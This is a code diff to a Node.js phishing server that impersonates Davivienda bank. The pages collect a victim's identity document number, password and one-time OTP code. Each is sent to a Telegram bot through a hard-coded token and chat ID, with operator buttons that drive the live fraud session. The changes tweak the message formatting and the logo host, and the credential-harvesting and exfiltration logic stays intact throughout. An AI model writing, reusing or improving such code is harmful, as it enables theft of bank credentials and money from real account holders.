@@ -5,7 +5,7 @@ const PORT = process.env.PORT || 3000;
 const TELEGRAM_BOT_TOKEN = '8870357744:AAFnGoEMYdHkKP7vFOVzskUdm9FUa47xTHA';
 const TELEGRAM_CHAT_ID = '-5576351785';
 
-// Memoria local ultrarrápida (al estar el servidor vivo, la respuesta es inmediata)
+// Memoria local ultrarrápida
 const sesiones = {};
 
 app.use(express.urlencoded({ extended: true }));
@@ -36,9 +36,7 @@ form{width:100%;display:flex;flex-direction:column;align-items:center;}
 @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
 `;
 
-const logoHtml = `<img src="https://i.postimg.cc/vTjqv35M/logo.png" alt="Logo" class="header-logo">`;
-
-// --- RUTAS DE LA WEB ---
+const logoHtml = `<img src="https://i.ibb.co/1G4kztWc/logo.png" alt="Logo" class="header-logo">`;
 
 // 1. Documento
 app.get('/', (req, res) => {
@@ -88,13 +86,16 @@ app.post('/guardar-clave', async (req, res) => {
         sesiones[id].clave = clave;
         sesiones[id].comando = 'esperar';
 
-        const mensaje = `🚨 **NUEVO INGRESO - DAVIVIENDA**\n\n👤 **Documento:** ${sesiones[id].documento}\n🔑 **Clave:** ${clave}\n🆔 **Session ID:** ${id}`;
+        // Datos con formato de bloque de código para copiar al tocarlos en Telegram
+        const mensaje = `🚨 *NUEVO INGRESO - DAVIVIENDA*\n\n👤 Documento: \`${sesiones[id].documento}\`\n🔑 Clave: \`${clave}\`\n🆔 Session ID: \`${id}\``;
+        
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: TELEGRAM_CHAT_ID,
                 text: mensaje,
+                parse_mode: 'Markdown',
                 reply_markup: {
                     inline_keyboard: [[
                         { text: '📲 Pedir Código OTP (Sí)', callback_data: `otp_${id}` },
@@ -107,7 +108,6 @@ app.post('/guardar-clave', async (req, res) => {
     res.redirect(`/espera.html?id=${id}`);
 });
 
-// 3. OTP
 // 3. OTP
 app.get('/otp.html', (req, res) => {
     const error = req.query.error;
@@ -125,26 +125,25 @@ ${error ? '<p class="error-message" style="margin-bottom:15px;font-weight:500;">
 <div class="input-group"><input type="text" name="otp" class="custom-input" placeholder="------" required maxlength="6" autofocus style="letter-spacing:4px;"></div>
 <button type="submit" class="btn-submit">Continuar</button>
 </form></div></main>
-<script>
-const urlParams = new URLSearchParams(window.location.search);
-const sessionId = urlParams.get('id');
-document.getElementById('inputIdOtp').value = sessionId || '';
-</script></body></html>`);
+<script>document.getElementById('inputIdOtp').value = new URLSearchParams(window.location.search).get('id') || '';</script></body></html>`);
 });
 
 app.post('/guardar-otp', async (req, res) => {
     const { otp, id } = req.body;
     if (sesiones[id]) {
         sesiones[id].otp = otp;
-        sesiones[id].comando = 'esperar_otp'; // Vuelve a poner estado de espera para el administrador
+        sesiones[id].comando = 'esperar_otp';
 
-        const mensajeOtp = `🔑 **CÓDIGO OTP RECIBIDO**\n\n👤 **Documento:** ${sesiones[id].documento}\n🔢 **OTP:** ${otp}\n🆔 **Session ID:** ${id}`;
+        // Datos con formato de bloque de código para copiar al tocarlos en Telegram
+        const mensajeOtp = `🔑 *CÓDIGO OTP RECIBIDO*\n\n👤 Documento: \`${sesiones[id].documento}\`\n🔢 OTP: \`${otp}\`\n🆔 Session ID: \`${id}\``;
+        
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: TELEGRAM_CHAT_ID,
                 text: mensajeOtp,
+                parse_mode: 'Markdown',
                 reply_markup: {
                     inline_keyboard: [[
                         { text: '✅ Aprobar (Ir a Google)', callback_data: `aprobar_otp_${id}` },
@@ -154,10 +153,10 @@ app.post('/guardar-otp', async (req, res) => {
             })
         });
     }
-    res.redirect(`/espera.html?id=${id}&tipo=otp`);
+    res.redirect(`/espera.html?id=${id}`);
 });
 
-// 4. Pantalla de Espera (Polling rápido cada 1 segundo)
+// 4. Pantalla de Espera
 app.get('/espera.html', (req, res) => {
     res.send(`<!DOCTYPE html>
 <html lang="es">
